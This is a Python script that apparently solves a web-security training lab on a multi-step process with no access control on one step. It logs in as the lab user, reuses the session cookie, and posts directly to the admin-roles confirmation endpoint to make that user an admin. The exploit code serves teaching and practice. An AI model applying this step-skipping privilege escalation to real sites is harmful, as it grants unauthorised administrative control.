##########################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: Multi-step process with no access control on one step
#
# Steps: 1. Login as wiener
#        2. Upgrade wiener to be an admin bypassing the first step
#
##########################################################################


###########
# imports
###########
import requests
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a4b00a003a6baaa845b4ab2004a0090.web-security-academy.net"

# set credentials
data = {
    "username": "wiener",
    "password": "peter"
}

try:      
    # login as wiener
    login = requests.post(f"{url}/login", data, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

# if you logged in successfully
if login.status_code == 302:
    print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")

    # get session cookie
    session = login.cookies.get("session")
    
    # set session cookie
    cookies = {"session": session}
    
    # set credentials
    data = {
        "username": "wiener",
        "action": "upgrade",
        "confirmed": "true"
    }
    
    try:      
        # upgrade wiener to be an admin bypassing the first step
        upgrade_wiener = requests.post(f"{url}/admin-roles", data, cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")
        exit(1)

    print(Fore.WHITE + "2. Upgrading wiener to be an admin bypassing the first step.. " + Fore.GREEN + "OK")        
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to login as wiener")

